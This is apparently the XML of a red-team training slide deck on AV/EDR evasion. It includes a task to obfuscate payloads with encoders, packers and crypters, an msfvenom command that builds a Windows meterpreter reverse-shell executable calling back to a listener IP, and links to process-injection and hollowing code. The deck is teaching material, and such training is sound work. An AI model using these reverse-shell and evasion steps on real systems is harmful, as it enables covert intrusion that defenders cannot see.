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7" r:id="rId3"/>
    <p:sldId id="259" r:id="rId4"/>
    <p:sldId id="258" r:id="rId5"/>
    <p:sldId id="329" r:id="rId6"/>
    <p:sldId id="260" r:id="rId7"/>
    <p:sldId id="262" r:id="rId8"/>
    <p:sldId id="330" r:id="rId9"/>
    <p:sldId id="363" r:id="rId10"/>
    <p:sldId id="364" r:id="rId11"/>
    <p:sldId id="365" r:id="rId12"/>
    <p:sldId id="284" r:id="rId13"/>
    <p:sldId id="362" r:id="rId14"/>
    <p:sldId id="332" r:id="rId15"/>
    <p:sldId id="333" r:id="rId16"/>
    <p:sldId id="334" r:id="rId17"/>
    <p:sldId id="335" r:id="rId18"/>
    <p:sldId id="336" r:id="rId19"/>
    <p:sldId id="337" r:id="rId20"/>
    <p:sldId id="338" r:id="rId21"/>
    <p:sldId id="339" r:id="rId22"/>
    <p:sldId id="340" r:id="rId23"/>
    <p:sldId id="341" r:id="rId24"/>
    <p:sldId id="342" r:id="rId25"/>
    <p:sldId id="343" r:id="rId26"/>
    <p:sldId id="344" r:id="rId27"/>
    <p:sldId id="345" r:id="rId28"/>
    <p:sldId id="346" r:id="rId29"/>
    <p:sldId id="367" r:id="rId30"/>
    <p:sldId id="368" r:id="rId31"/>
    <p:sldId id="369" r:id="rId32"/>
    <p:sldId id="347" r:id="rId33"/>
    <p:sldId id="348" r:id="rId34"/>
    <p:sldId id="349" r:id="rId35"/>
    <p:sldId id="350" r:id="rId36"/>
    <p:sldId id="366" r:id="rId37"/>
    <p:sldId id="351" r:id="rId38"/>
    <p:sldId id="352" r:id="rId39"/>
    <p:sldId id="353" r:id="rId40"/>
    <p:sldId id="354" r:id="rId41"/>
    <p:sldId id="355"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5E719"/>
    <a:srgbClr val="7C4AD6"/>
    <a:srgbClr val="5928B2"/>
    <a:srgbClr val="E846C5"/>
    <a:srgbClr val="8C448E"/>
    <a:srgbClr val="1CD6B7"/>
    <a:srgbClr val="D94415"/>
    <a:srgbClr val="D1A2D2"/>
    <a:srgbClr val="008A3E"/>
    <a:srgbClr val="B971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982" autoAdjust="0"/>
    <p:restoredTop sz="94061" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="75" d="100"/>
          <a:sy n="75" d="100"/>
        </p:scale>
        <p:origin x="882" y="-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025026C-F80C-4B31-A07F-D5B4CCB3C106}"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91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4091738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25026C-F80C-4B31-A07F-D5B4CCB3C106}"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91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2388505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5026C-F80C-4B31-A07F-D5B4CCB3C106}"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91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3532416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25026C-F80C-4B31-A07F-D5B4CCB3C106}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/15/2026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91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2759806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25026C-F80C-4B31-A07F-D5B4CCB3C106}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/15/2026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B91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1301909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25026C-F80C-4B31-A07F-D5B4CCB3C106}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/15/2026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B91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="132692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5026C-F80C-4B31-A07F-D5B4CCB3C106}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/15/2026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BB91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2652807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025026C-F80C-4B31-A07F-D5B4CCB3C106}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/15/2026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91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2151605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025026C-F80C-4B31-A07F-D5B4CCB3C106}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/15/2026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91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1043954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25026C-F80C-4B31-A07F-D5B4CCB3C106}"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91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2917656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25026C-F80C-4B31-A07F-D5B4CCB3C106}"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91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4245789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4025026C-F80C-4B31-A07F-D5B4CCB3C106}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/15/2026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BBB91009-8A4B-41BE-B63D-AB7129C0E454}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2352046204"/>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umarniazafrid/fix_pe_aggressive.py"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10.0.0.5/payload.exe"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umarniazafrid/Process-Injection.cpp/blob/main/Process%20Injection%20Explanation" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/umarniazafrid/Process-Injection.cpp"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umarniazafrid/Process-Injection.cpp/blob/main/Shellcode%20Injection%20Explanation" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/umarniazafrid/Process-Injection.cpp/blob/main/Shellcode%20Injection"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github.com/umarniazafrid/WEEK-09-Task-4-Part-2-Process-Hollowing/blob/main/Process%20Hollowing%20code%20Explanation" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/umarniazafrid/WEEK-09-Task-4-Part-2-Process-Hollowing"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71000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="83000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1"/>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Week 09</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prepared by Umar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Niaz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Red Team Trainer at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Cyberster</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="405184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71000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="83000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1"/>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2352308"/>
            <a:ext cx="12192000" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Month 03 | Week 09: AV/EDR Evasion &amp; Defensive Bypassing </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="301869" y="3373071"/>
            <a:ext cx="11119339" cy="2847608"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Objective:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> To learn how to bypass modern security defenses like Windows Defender, AMSI, and basic EDR solutions using obfuscation and "Living off the Land" techniques. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="996541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71000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="83000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1"/>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buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFC000"/>
              </a:solidFill>
              <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFC000"/>
              </a:solidFill>
              <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>  					  Task 1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2206796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71000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="83000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1"/>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 y="365125"/>
            <a:ext cx="12684368" cy="1052537"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 01: Payload Obfuscation &amp; Signature Evasion </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1417661"/>
            <a:ext cx="12192000" cy="5309709"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="BE18B2">
              <a:alpha val="40000"/>
            </a:srgbClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Standard payloads (like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>MSFVenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) are easily caught by Antivirus. You must learn to hide them. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Requirements: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Generate a standard meterpreter shell and check it against </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>VirusTotal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (or a private scanner to avoid distribution). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Encoders</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shikata_ga_nai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) and compare detection rates. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Advanced:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Packers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (like UPX) or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Crypters</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to wrap the payload. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Use tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>-Payload-Creator (MPC)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Villain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to create stealthier connections. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Understand how signature-based detection works and how simple changes in the file structure can bypass it. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="804461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71000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="83000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1"/>
            </a:gs>
          </a:gsLst>
          <a:lin ang="5400000" scaled="1"/>
        </a:gradFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>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982BA212-77F0-06C9-67E1-95B4263BF356}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="11887200" cy="3776418"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15151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900" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Task 1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900" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Part 1: Baseline Payload Generation &amp; Static Scan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>. Generate Baseline Payload (Kali)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Menlo"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>msfvenom -p windows/x64/meterpreter/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1900" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>LHOST=192.168.1.193  LPORT=4444 -f exe -o payload1.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>. Scan with Windows Defender (on VM)</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200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Right‑click file → "Scan with Microsoft Defender"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68EB99DF-1220-0C21-73DA-BDB80F1A4AD7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect r="36503"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
